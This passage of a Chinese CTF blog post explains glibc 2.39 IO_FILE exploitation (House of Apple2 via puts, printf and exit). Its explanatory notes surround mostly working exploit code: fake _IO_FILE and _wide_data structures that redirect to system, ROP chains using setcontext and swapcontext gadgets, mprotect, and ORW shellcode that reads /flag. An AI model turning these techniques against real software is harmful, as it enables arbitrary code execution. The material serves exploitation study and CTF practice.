+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fake_io = p64(0) #flags </span></span><br><span class="line"><span class="comment">#fake_io += p64(0)#IO read ptr</span></span><br><span class="line">fake_io = p64(<span class="number">0</span>)<span class="comment">#IO read end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#I0 read base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#IO write base</span></span><br><span class="line">fake_io += p64(<span class="number">1</span>)<span class="comment">#IO write ptr</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#IO write end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#IO buf base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#IO buf end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#_IO_save_base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#_IO_backup_base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#_IO_save_end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#_markers</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="comment">#chain</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#old_offset</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(addr1+<span class="number">0x40</span>)<span class="comment">#_lock </span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io += p64(addr1)<span class="comment">#_wide_data</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_io += p64(_IO_wfile_jumps)<span class="comment">#vtable</span></span><br><span class="line">fake_io += p64(addr1+<span class="number">0x80</span>) <span class="comment">#28</span></span><br><span class="line">fake_io += p64(system) </span><br></pre></td></tr></table></figure>
+
+<h2 id="（5）2-39-House-of-Apple2（puts）"><a href="#（5）2-39-House-of-Apple2（puts）" class="headerlink" title="（5）2.39 House of Apple2（puts）"></a>（5）2.39 House of Apple2（puts）</h2><p>与2.35区别</p>
+<p>1.largebin 检查完善，挂入链表时候，也就是largebin attack时候要给fd bk fdnextsize改回去，并且unsortbin的fd与bk与2.35不通记得改</p>
+<p>2.中间有一些操作导致结构体中数据被改，要绕开这些地址，防止结构体被改，这个不用担心，因为wide_data段是另一个堆块不会被影响</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#stdout = p64(0) #flags </span></span><br><span class="line"><span class="meta">#stdout += p64(0)#IO read ptr</span></span><br><span class="line"><span class="built_in">stdout</span> = p64(<span class="number">0x7ffff7e03b20</span>)#IO read end</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0x7ffff7e03b20</span>)#I0 read base</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#IO write base</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#IO write ptr</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#IO write end</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#IO buf base</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#IO buf end</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#_IO_save_base</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#_IO_backup_base</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#_IO_save_end</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)#_markers</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)<span class="meta">#chain</span></span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0xffffffffffffffff</span>)#old_offset</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">stdout</span> += p64(addr2+<span class="number">0x30</span>)#_lock </span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line"><span class="built_in">stdout</span> += p64(addr1)#_wide_data</span><br><span class="line"><span class="built_in">stdout</span> += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line"><span class="built_in">stdout</span> += p64(_IO_wfile_jumps<span class="number">-0x20</span>)<span class="meta">#vtable</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">stdout</span>)</span><br><span class="line">#wide_data = p64(<span class="number">0</span>) <span class="meta">#flags </span></span><br><span class="line">#wide_data += p64(<span class="number">0</span>)#IO read ptr</span><br><span class="line">wide_data = p64(<span class="number">0</span>)#IO read end</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#I0 read base</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#IO write base</span><br><span class="line">wide_data += p64(<span class="number">1</span>)#IO write ptr</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#IO write end</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#IO buf base</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#IO buf end</span><br><span class="line">wide_data += p64(addr2+<span class="number">0x10</span>)#_IO_save_base</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#_IO_backup_base</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#_IO_save_end</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#_markers</span><br><span class="line">wide_data += p64(addr1)<span class="meta">#chain</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)</span><br><span class="line">wide_data += p64(<span class="number">0xffffffffffffffff</span>)#old_offset</span><br><span class="line">wide_data += p64(<span class="number">0</span>)</span><br><span class="line">wide_data += p64(<span class="number">0</span>)#_lock </span><br><span class="line">wide_data += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)#_wide_data</span><br><span class="line">wide_data += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">wide_data += p64(addr1+<span class="number">0x80</span>) #<span class="number">28</span></span><br><span class="line">wide_data += p64(system) </span><br><span class="line">edit(<span class="number">1</span>,wide_data)</span><br></pre></td></tr></table></figure>
+
+<h2 id="（6）2-39-House-of-Apple2（orw）"><a href="#（6）2-39-House-of-Apple2（orw）" class="headerlink" title="（6）2.39 House of Apple2（orw）"></a>（6）2.39 House of Apple2（orw）</h2><h3 id="1-shellcode"><a href="#1-shellcode" class="headerlink" title="1.shellcode"></a>1.shellcode</h3><p>这个片段可以控制rsp，并且后面有return，那我们把攻击代码写在rsp的地方就可以执行，但是不能写orw了，因为没有pop rdx，所以调用mprotect，获取shell写shellcode</p>
+<p>我们可以发现所有寄存器的值都是由r12控制的但是r12的值错误，我们要找到一个可以控制r12，且有call的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">svcudp_reply = libc_base+0x179220+29</span><br><span class="line">swapcontext = libc_base+0x5814d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/18/IO/1758259333974-7187c268-c67d-40bf-9b91-108ce911012c.png" alt="img"></p>
+<p><img src="/2025/11/18/IO/1758259406367-6ef6d938-90ab-4a66-a72a-816bc8b36a77.png" alt="img"></p>
+<p>在2.39svcudp_reply+26刚好可以满足，原本2.35下svcudp_reply+26可以直接用rdi控制rbp，再接leave ret就可以控制rsp了</p>
+<p>rax就是largebin attack的头</p>
+<p><img src="/2025/11/18/IO/1758198996019-490a7149-94c5-4c9d-8f7a-0be28035b57d.png" alt="img"></p>
+<p>注：这里我们要控制rsp的值，与rcx的值，因为push rax后rsp &#x3D; rax，并且push的时候rsp的值要有地址</p>
+<p>我们将rcx &#x3D; mprotect参数设置好，后面就会调用成功，并且后面还有个ret 这时候就会执行rsp的内容，我们将orw写在这里就好</p>
+<p>rsp &#x3D; &amp;addr</p>
+<p>add &#x3D; &amp;orw</p>
+<p>第一个<img src="/2025/11/18/IO/1758262312038-fa6f4825-cb6e-4895-aeca-f648d1b31df7.png" alt="img"></p>
+<p>第二个</p>
+<p><img src="/2025/11/18/IO/1758262341349-de08b097-95d5-4905-880d-0596124baebb.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#fake_io = p64(0) #flags </span><br><span class="line">#fake_io += p64(0)#IO read ptr</span><br><span class="line">fake_io = p64(0)#IO read end</span><br><span class="line">fake_io += p64(0)#I0 read base</span><br><span class="line">fake_io += p64(0)#IO write base</span><br><span class="line">fake_io += p64(1)#IO write ptr</span><br><span class="line">fake_io += p64(0)#IO write end</span><br><span class="line">fake_io += p64(0)#IO buf base</span><br><span class="line">fake_io += p64(0)#IO buf end</span><br><span class="line">fake_io += p64(addr1+0x10)#_IO_save_base   r12</span><br><span class="line">fake_io += p64(0)#_IO_backup_base</span><br><span class="line">fake_io += p64(0)#_IO_save_end</span><br><span class="line">fake_io += p64(0)#_markers</span><br><span class="line">fake_io += p64(0)#chain</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0xffffffffffffffff)#old_offset</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0x7ffff7e05700)#_lock </span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(addr2)#_wide_data</span><br><span class="line">fake_io += p64(0)*6</span><br><span class="line">fake_io += p64(_IO_wfile_jumps)#vtable</span><br><span class="line">fake_io += p64(addr2+0x80) #28</span><br><span class="line">fake_io += p64(svcudp_reply)  </span><br><span class="line">edit(2,fake_io)</span><br><span class="line">payload = b&#x27;a&#x27;*0x18+p64(addr1+0x10)+p64(addr0+0x10)+p64(swapcontext) addr1 = payload</span><br><span class="line">payload = payload.ljust(0x68,b&#x27;a&#x27;)+p64(addr1-0x6f0)+p64(0x3000)+p64(addr1+0x500)  #rdi rsi rsp = flag&#123;......&#125;</span><br><span class="line">payload = payload.ljust(0x88,b&#x27;a&#x27;)+p64(7)  #rdx</span><br><span class="line">payload = payload.ljust(0xa0,b&#x27;a&#x27;)+p64(addr1+0xf8)+p64(mprotect) #rsp=&amp;orw-8 rcx</span><br><span class="line">payload = payload.ljust(0xe0,b&#x27;a&#x27;)+p64(addr1) #pre rcx 有个地址就行</span><br><span class="line">orw = asm(&#x27;&#x27;&#x27;</span><br><span class="line">    mov rdi, 0x67616c662f</span><br><span class="line">    push rdi</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    mov rax, 2</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi,rax</span><br><span class="line">    mov rsi, rbp</span><br><span class="line">    mov rdx, 0x100</span><br><span class="line">    xor rax, rax</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rdx, rax</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line">    xor rax, rax</span><br><span class="line">    add rax, 60</span><br><span class="line">    syscall</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">edit(1,payload+p64(addr1+0x100)+orw)  #orw addr</span><br></pre></td></tr></table></figure>
+
+<p>为什么rsp&#x3D;&amp;orw-8</p>
+<p>因为ret &#x3D; addr1+0x100，这样就会执行到orw但是rsp也要跟上，ret后rsp+8就等于&amp;orw</p>
+<h3 id="2-ROP-puts"><a href="#2-ROP-puts" class="headerlink" title="2.ROP puts"></a>2.ROP puts</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">orw = p64(pop_rsi) + p64(flag)*6+ p64(pop_rdi) +p64(0xffffffffffffffff)+ p64(open_addr)   #*rdx+0xe0=rcx = addr</span><br><span class="line">orw += p64(pop_rdi) + p64(3)+p64(pop_rsi) + p64(flag_addr) +p64(pop_rdx)+p64(0x100)+p64(0)*4+p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(write_addr)+b&#x27;/flag\x00\x00\x00&#x27;</span><br><span class="line">payload = b&#x27;a&#x27;*0x18+p64(addr1)+p64(addr1+0x10)+p64(magic2)  #addr1 = &amp;payload =rax rsp </span><br><span class="line">payload = payload.ljust(0x68,b&#x27;a&#x27;)+p64(libc_base)+p64(0x100000) #rdi rsi </span><br><span class="line">payload = payload.ljust(0x88,b&#x27;a&#x27;)+p64(0)  #rdx</span><br><span class="line">payload = payload.ljust(0xa0,b&#x27;a&#x27;)+p64(_IO_2_1_stderr_addr-0x8)+orw #rsp=&amp;pop_rdi-0x8 rcx=orw </span><br></pre></td></tr></table></figure>
+
+<p><em>flag &#x3D; &#x2F;flag\x00\x00\x00 这里为什么写这么多flag，因为</em>rdx+0xe0&#x3D;rcx &#x3D; addr，rcx的值要是一个地址</p>
+<p>为什么rsp&#x3D;&amp;pop_rdi-0x8</p>
+<p>因为ret后rsp+8，写&amp;pop_rdi-0x8，这样执行完pop_rsp,以及ret后，就会接着执行pop rdi</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">fake_io = p64(0) #flags </span><br><span class="line">fake_io += p64(0x7ffff7e04643)#IO read ptr</span><br><span class="line">fake_io = p64(0x7ffff7e04643)#IO read end</span><br><span class="line">fake_io += p64(0)#I0 read base</span><br><span class="line">fake_io += p64(0)#IO write base</span><br><span class="line">fake_io += p64(1)#IO write ptr</span><br><span class="line">fake_io += p64(0)#IO write end</span><br><span class="line">fake_io += p64(0)#IO buf base</span><br><span class="line">fake_io += p64(0)#IO buf end</span><br><span class="line">fake_io += p64(addr1)#_IO_save_base</span><br><span class="line">fake_io += p64(0)#_IO_backup_base</span><br><span class="line">fake_io += p64(0)#_IO_save_end</span><br><span class="line">fake_io += p64(0)#_markers</span><br><span class="line">fake_io += p64(0)#chain</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0xffffffffffffffff)#old_offset</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0x7ffff7e045c0)#_lock </span><br><span class="line">fake_io += p64(0)*2</span><br><span class="line">fake_io += p64(_IO_2_1_stdout_addr)#_wide_data &amp;flags</span><br><span class="line">fake_io += p64(0)*6</span><br><span class="line">fake_io += p64(_IO_wfile_jumps-0x20)#vtable</span><br><span class="line">fake_io += p64(_IO_2_1_stdout_addr+0x80) #28</span><br><span class="line">fake_io += p64(magic)  #magic = svcudp_reply+29</span><br></pre></td></tr></table></figure>
+
+<h2 id="（7）printf"><a href="#（7）printf" class="headerlink" title="（7）printf"></a>（7）printf</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fake_file=flat(&#123;</span><br><span class="line">0x0: p64(addr1+0x10), #&amp;orw</span><br><span class="line">0x8: &quot;/flag\0&quot;,</span><br><span class="line">0x10: p64(libc_base+libc.symbols[&#x27;setcontext&#x27;] +61),#_wide_vtable+0x18 也就是这里__overflow</span><br><span class="line">0x20: p64(libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]), #_IO_write_base</span><br><span class="line">0x88: p64(libc_base+libc.symbols[&#x27;_environ&#x27;]-0x10),  #_lock</span><br><span class="line">0xa0: p64(libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]),#rsp _wide_data</span><br><span class="line">0xa8: p64(pop_rsp),</span><br><span class="line">0xd8: p64(libc_base+libc.symbols[&#x27;_IO_wfile_jumps&#x27;] +0x10),</span><br><span class="line">0xe0: p64(libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]-8), #_wide_vtable</span><br><span class="line">&#125;, filler=b&quot;\x00&quot;)</span><br><span class="line">_vfprintf_internal</span><br><span class="line">-&gt;__printf_buffer_to_file_done</span><br><span class="line">-&gt;_IO_wfile_seekoff/*(fp-&gt;vtable+0x38)(fp) #_IO_wfile_jumps+0x10</span><br><span class="line">-&gt;_IO_switch_to_wget_mode</span><br><span class="line">-&gt;(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18) </span><br></pre></td></tr></table></figure>
+
+<p>在<code>_IO_wfile_seekoff</code>中，还有一些条件需要满足，首先<code>rcx</code>寄存器需要不为0，<code>_IO_wfile_seekoff</code>要求<code>rcx</code>不为 0，并非 “寄存器本身不能为 0”，而是<strong>通过</strong><code>**rcx**</code><strong>传递的</strong><code>**mode**</code><strong>参数必须是 “合法的非 0 值”</strong>—— 因为<code>mode</code>是函数判断 “操作合法性”“缓冲区同步逻辑” 的前提，若<code>mode=0</code>，函数失去核心判断依据，无法安全、正确地执行 “宽字符文件偏移” 操作。</p>
+<h2 id="总结一下所有的调用链"><a href="#总结一下所有的调用链" class="headerlink" title="总结一下所有的调用链"></a>总结一下所有的调用链</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p *(struct _IO_FILE_plus *)</span><br><span class="line">p *(struct _IO_wide_data *)</span><br><span class="line">p *(struct _IO_jump_t *)</span><br></pre></td></tr></table></figure>
+
+<p>exit调用io虚表的偏移是0x18</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__run_exit_handlers</span><br><span class="line">--&gt;&gt;_IO_cleanup #_IO_flush_all_lockp</span><br><span class="line">--&gt;&gt;*(fp-&gt;vtable+0x18)(fp) #_IO_wfile_overflow</span><br></pre></td></tr></table></figure>
+
+<p>printf 调用io虚表偏移0x38</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_vfprintf_internal</span><br><span class="line">--&gt;&gt;__printf_buffer_to_file_done</span><br><span class="line">--&gt;&gt;*(fp-&gt;vtable+0x38)(fp)  #_IO_wfile_xsputn</span><br></pre></td></tr></table></figure>
+
+<p>puts也是调用io虚表偏移0x38</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_vfprintf_internal</span><br><span class="line">--&gt;&gt;__printf_buffer_to_file_done</span><br><span class="line">--&gt;&gt;*(fp-&gt;vtable+0x38)(fp)  #_IO_wfile_xsputn</span><br></pre></td></tr></table></figure>
+
+<p>我们打io不管他是调用偏移多少的，我们通过改的偏移让他调用_IO_wfile_overflow</p>
+<p>_IO_wfile_jumps:   puts和printf我们都将虚表改成_IO_wfile_jumps-0x20</p>
+<p>_IO_wfile_seekoff: puts和printf我们都将虚表改成_IO_wfile_jumps+0x10 </p>
+<p>​                                                exit我们将虚表改成_IO_wfile_jumps-0x10</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">--&gt;&gt;_IO_wdoallocbuf</span><br><span class="line">    --&gt;&gt;_IO_WDOALLOCATE</span><br><span class="line">        --&gt;&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)/</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable-&gt;_doallocate)(fp)</span><br><span class="line">-&gt;_IO_wfile_seekoff</span><br><span class="line">-&gt;_IO_switch_to_wget_mode</span><br><span class="line">-&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)</span><br><span class="line">  *(fp-&gt;_wide_data-&gt;_wide_vtable-&gt;__overflow)(fp)</span><br><span class="line">fake_io = flat(&#123;</span><br><span class="line">    #0x0: /bin/sh\x00 这个用上一个堆块0x8结尾改pre_size</span><br><span class="line">    #0x8: p64(0),</span><br><span class="line">    0x8: p64(1),,</span><br><span class="line">    0x58: p64(0xffffffffffffffff),</span><br><span class="line">    0x78: p64(libc_base+libc.symbols[&#x27;_environ&#x27;]-0x10),  #_lock</span><br><span class="line">    0x80: p64(addr1),</span><br><span class="line">    0xb8: p64(libc_base+libc.symbols[&#x27;_IO_wfile_jumps&#x27;]),</span><br><span class="line">    0xc0: p64(addr1 + 0x80),</span><br><span class="line">    0xc8: p64(system)</span><br><span class="line">&#125;, filler=b&#x27;\x00&#x27;)</span><br><span class="line">fake_file=flat(&#123;</span><br><span class="line">#0x0: p64(addr1+0x10), #&amp;orw 这个用上一个堆块0x8结尾改pre_size</span><br><span class="line">#0x8: &quot;/flag\0&quot;,</span><br><span class="line">0x00: p64(libc_base+libc.symbols[&#x27;setcontext&#x27;] +61),#_wide_vtable+0x18</span><br><span class="line">0x10: p64(addr1+0x10), #_IO_write_base rdx</span><br><span class="line">0x78: p64(libc_base+libc.symbols[&#x27;_environ&#x27;]-0x10),  #_lock</span><br><span class="line">0x90: p64(addr1),#rsp _wide_data</span><br><span class="line">0x98: p64(pop_rsp),</span><br><span class="line">0xc8: p64(libc_base+libc.symbols[&#x27;_IO_wfile_jumps&#x27;] +0x10),</span><br><span class="line">0xd0: p64(addr1+8), #_wide_vtable</span><br><span class="line">&#125;, filler=b&quot;\x00&quot;)</span><br><span class="line">orw = p64(pop_rsi) + p64(0)+ p64(pop_rdi)+p64(flag)+p64(pop_rdx)+p64(0)+p64(0)*4+p64(open_addr)   #*rdx+0xe0 = addr</span><br><span class="line">orw += p64(pop_rdi) + p64(3)+p64(pop_rsi) + p64(flag_addr) +p64(pop_rdx)+p64(0x100)+p64(0)*4+p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(write_addr)+b&quot;/flag\x00\x00\x00&quot;  </span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag"># 知识点</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/18/House-of-%E7%B3%BB%E5%88%97/" rel="prev" title="House of 系列">
+      <i class="fa fa-chevron-left"></i> House of 系列
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E5%88%A9%E7%94%A8stdout%E6%B3%84%E9%9C%B2libc"><span class="nav-number">1.</span> <span class="nav-text">1.利用stdout泄露libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981-UAF-%E5%A0%86%E9%A3%8E%E6%B0%B4"><span class="nav-number">1.1.</span> <span class="nav-text">例题1 UAF 堆风水</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%982%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C"><span class="nav-number">1.2.</span> <span class="nav-text">例题2数组越界</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-stdin%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E7%BC%93%E5%86%B2%E5%8C%BA%E8%BF%9B%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="nav-number">2.</span> <span class="nav-text">2.stdin标准输入缓冲区进行任意地址写</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-stdout%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E7%BC%93%E5%86%B2%E5%8C%BA%E8%BF%9B%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="nav-number">3.</span> <span class="nav-text">3.stdout标准输入缓冲区进行任意地址写</span></a></li><li class="nav-item 